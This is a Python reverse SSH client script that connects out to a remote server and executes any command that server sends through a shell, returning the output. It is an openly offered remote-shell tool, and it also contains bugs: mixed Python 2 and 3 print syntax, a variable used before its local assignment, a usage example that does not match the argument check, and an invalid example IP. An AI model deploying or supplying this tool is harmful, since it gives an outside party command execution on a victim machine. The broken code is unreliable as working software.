import sys
import subprocess
import paramiko as p
import socket as s

user = ""
passwd = ""
target_ip = ""
target_port = 22
# This string is sent first upon connection and is changed when
# commands are received from the remote server.
command = "ClientConnected"

def usage():
    print("\nUsage: rssh_client.py [remote_ip] [remote_ssh_port=22] [username] [password]\n")
    print("This reverse SSH client connects to a listening server and provides that server a shell.\n")
    print("Example usage:")
    print("rssh_client.py 123.456.2.1 8080")
    sys.exit(0)

def ssh_command(ip,  user, passwd, port=22):
    # Initialize SSHClient object and get a Transport.
    c = p.SSHClient()
    # Optional line below.
    # c.load_host_keys('/home/[yourUsername]/.ssh/known_hosts')
    c.set_missing_host_key_policy(p.AutoAddPolicy())
    c.connect(ip, username=user, port=port, password=passwd)
    session = c.get_transport().open_session()

    if session.active:
        session.send(command)
        print session.recv(1024)
        while True:
            try:
                command = session.recv(1024)
            except EOFError as e:
                session.send("Session closed.")
                break
            try:
                out = subprocess.check_output(command, shell=True)
                session.send(out)
            except Exception as e:
                session.send(str(e))
        c.close()
    return

if __name__ == "__main__":
    if len(sys.argv[1:]) == 3:
        target_ip = sys.argv[1]
        user = sys.argv[2]
        passwd = sys.argv[3]
    elif len(sys.argv[1:]) == 4:
        target_ip = sys.argv[1]
        try:
            target_port = int(sys.argv[2])
        except ValueError as e:
            print("\nUse integer for port number, or not at all if the port is 22.\n")
            usage()
        user = sys.argv[3]
        passwd = sys.argv[4]
    else:
        usage()

    ssh_command(target_ip, user, passwd, target_port)
